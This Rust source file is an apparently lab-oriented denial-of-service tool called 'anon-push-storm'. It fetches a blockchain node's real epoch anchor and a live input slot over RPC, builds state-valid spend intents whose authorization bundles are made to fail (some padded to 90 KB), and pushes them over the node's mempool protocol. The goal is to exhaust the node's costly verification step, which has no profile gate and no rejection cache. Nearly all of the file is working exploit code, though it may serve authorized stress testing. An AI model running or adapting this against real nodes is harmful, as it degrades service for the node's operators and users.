//! Anonymous mempool-Push storm for phase 7 (C22 composition, live leg).
//!
//! Constructs state-valid PagedSpend intents against the victim's REAL chain
//! (public epoch anchor + a live input slot, fetched over loopback RPC) with
//! decode-failing authorization bundles, and delivers them as
//! `MempoolRequest::Push` frames over the shared hand-driven noise+yamux
//! transport (identify responder keeps the endpoint open). Per the
//! tx-admission lane (C22): Push is the one request-response arm with no
//! profile gate; each payload costs the node a full authorization verify
//! (~8 ms) while the attacker pays only construction; failed proofs reserve
//! nothing and there is no rejection cache.

use std::str::FromStr;
use std::time::{Duration, Instant};

use anyhow::{bail, Context, Result};
use futures::future::poll_fn;

use noid_poseidon2b::primitives::Address;
use noid_tx::{
    output_bitmap_bit, PagedSpendIntent, TxBody, TxInput, TxOutput, TxPage,
    PAGED_SPEND_END_BIT, PAGED_SPEND_START_BIT, TX_INPUTS, TX_OUTPUTS,
};

fn decode_hex32(s: &str) -> Option<[u8; 32]> {
    let bytes: Vec<u8> = (0..s.len())
        .step_by(2)
        .filter_map(|i| u8::from_str_radix(s.get(i..i + 2)?, 16).ok())
        .collect();
    bytes.try_into().ok()
}

#[path = "../aggressor_common.rs"]
mod common;
use common::{conn_aware, connect, negotiate_outbound, MEMPOOL_PROTOCOL};

async fn rpc_json(url: &str, method: &str, params: serde_json::Value) -> Result<serde_json::Value> {
    let body = serde_json::json!({
        "jsonrpc": "2.0", "id": 1, "method": format!("paranoid_{method}"), "params": params
    });
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(20))
        .build()?;
    let response = client.post(url).json(&body).send().await?;
    Ok(response.json().await?)
}

fn build_intent(anchor: [u8; 32], live_input: TxInput, owner: Address, fee: u64, auth: &[u8]) -> Vec<u8> {
    let mut inputs = [TxInput::dummy(); TX_INPUTS];
    inputs[0] = live_input;
    let mut outputs = [TxOutput::dummy(); TX_OUTPUTS];
    outputs[0] = TxOutput {
        slot_index: 4000,
        amount: live_input.amount.saturating_sub(fee),
        owner: Address([0xB1; 32]),
    };
    let page = TxPage::new(TxBody {
        epoch_anchor: anchor,
        fee,
        input_owner: owner,
        inputs,
        outputs,
        validity_bitmap: 1 | output_bitmap_bit(0) | PAGED_SPEND_START_BIT | PAGED_SPEND_END_BIT,
        is_coinbase: false,
    })
    .expect("page");
    PagedSpendIntent::new(vec![page], auth.to_vec())
        .expect("intent")
        .to_bytes()
        .expect("encode")
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<()> {
    let mut args: Vec<String> = std::env::args().skip(1).collect();
    let victim_p2p = args
        .first()
        .cloned()
        .context("usage: anon-push-storm 127.0.0.1:P2P --rpc URL [--rate N/10s] [--count N] [--label L]")?;
    args.remove(0);
    let mut rpc_url = String::from("http://127.0.0.1:9601");
    let mut rate = 5usize;
    let mut count = 200usize;
    let mut label = String::from("push");
    let mut owner_bech32 = String::new();
    while !args.is_empty() {
        let flag = args.remove(0);
        let value = args.first().cloned().context("flag missing value")?;
        args.remove(0);
        match flag.as_str() {
            "--rpc" => rpc_url = value,
            "--rate" => rate = value.parse()?,
            "--count" => count = value.parse()?,
            "--label" => label = value,
            "--owner" => owner_bech32 = value,
            other => bail!("unknown flag {other}"),
        }
    }

    // Public chain data for STATE-VALID bodies (admission checks state
    // validity before the expensive authorization verify): the real current
    // epoch anchor, and one real live slot owned by the given address.
    let anchor_hex = rpc_json(&rpc_url, "getEpochAnchor", serde_json::json!([]))
        .await?
        ["result"].as_str().context("epoch anchor")?.to_string();
    let anchor = decode_hex32(&anchor_hex).context("anchor hex")?;

    let owner = Address::from_str(&owner_bech32).context("parse --owner bech32")?;
    let slots = rpc_json(&rpc_url, "getSlotsByOwner", serde_json::json!([owner_bech32]))
        .await?
        ["result"].as_array().cloned().unwrap_or_default();
    let first = slots
        .iter()
        .find(|slot| slot["empty"].as_bool() == Some(false) && slot["value"].as_u64().unwrap_or(0) > 100_000)
        .or_else(|| slots.first())
        .cloned()
        .context("no live slot for owner")?;
    let live_input = TxInput {
        slot_index: first["slot_index"].as_u64().unwrap_or(1) as u32,
        amount: first["value"].as_u64().unwrap_or(1_000_000_000),
        creation_id: first["creation_id"].as_u64().unwrap_or(0),
    };
    println!(
        "[{label}] victim={victim_p2p} anchor={}... live_slot={} value={} rate={rate}/10s count={count}",
        &anchor_hex[..12], live_input.slot_index, live_input.amount
    );

    let framing_inner: Vec<u8> = (0..90_000).map(|i| (i as u8).wrapping_mul(31).wrapping_add(7)).collect();
    let payloads: Vec<Vec<u8>> = (0..count)
        .map(|i| {
            if i % 2 == 0 {
                build_intent(anchor, live_input, owner, 40_000 + i as u64, &[0x42; 64])
            } else {
                build_intent(anchor, live_input, owner, 240_000 + i as u64, &framing_inner)
            }
        })
        .collect();
    println!(
        "[{label}] built {} intents (sizes {:?}..{:?} B)",
        payloads.len(),
        payloads.first().map(Vec::len),
        payloads.get(1).map(Vec::len),
    );

    let started = Instant::now();
    let mut connection = connect(&victim_p2p).await.context("transport")?;
    println!("[{label}] transport up in {:?}", started.elapsed());

    let mut pushed = 0usize;
    let mut failures = 0usize;
    let interval = Duration::from_millis((10_000 / rate.max(1)) as u64);
    let mut next_slot = Instant::now();
    for payload in &payloads {
        // Pace while keeping the connection driven (answers identify/ping).
        if Instant::now() < next_slot {
            let mut sleep = Box::pin(tokio::time::sleep_until(tokio::time::Instant::from_std(next_slot)));
            conn_aware(&mut connection, &mut sleep).await?;
        }
        let mut request = vec![b'N', b'M', b'R', b'3', 1, 0, 0, 0];
        request.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        request.extend_from_slice(payload);
        let stream = poll_fn(|cx| connection.poll_new_outbound(cx)).await?;
        let mut issue = Box::pin(async move {
            let mut stream = stream;
            negotiate_outbound(&mut stream, MEMPOOL_PROTOCOL).await?;
            use futures::AsyncWriteExt;
            stream.write_all(&request).await?;
            stream.flush().await?;
            stream.close().await?;
            Ok::<(), anyhow::Error>(())
        });
        match conn_aware(&mut connection, &mut issue).await {
            Ok(Ok(())) => pushed += 1,
            Ok(Err(error)) | Err(error) => {
                failures += 1;
                if failures <= 3 || failures % 50 == 0 {
                    println!("[{label}] push failure #{failures}: {error}");
                }
            }
        }
        next_slot = Instant::now() + interval;
    }
    println!("[{label}] done in {:?}: pushed={pushed} failures={failures}", started.elapsed());
    Ok(())
}
